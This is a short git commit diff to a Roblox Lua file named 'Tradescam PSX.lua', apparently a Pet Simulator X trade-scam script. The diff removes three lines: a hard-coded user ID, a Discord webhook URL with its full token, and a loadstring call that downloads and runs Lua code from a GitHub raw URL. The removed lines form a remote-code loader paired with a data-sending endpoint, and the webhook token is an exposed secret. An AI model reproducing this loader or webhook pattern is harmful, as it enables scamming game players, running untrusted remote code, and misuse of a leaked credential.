23872bf6a14507a0f9b6d2c708602113fd60365e
Hshshahshsh <110442121+Hshshahshsh@users.noreply.github.com>
2022-12-11 22:42:43 +0800

    Update Tradescam PSX.lua

--- Tradescam PSX.lua
+++ Tradescam PSX.lua
@@ -1,3 +1,1 @@
-_G.UserID = 3573818578
-_G.WebHook = "https://discord.com/api/webhooks/1045464333150322689/lbVqdph15sIPQDKthby4L2n_ZyyCsECEDj0CdpR_cCzsv2oGdYh46yTLIbsuA6exGqnP"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+
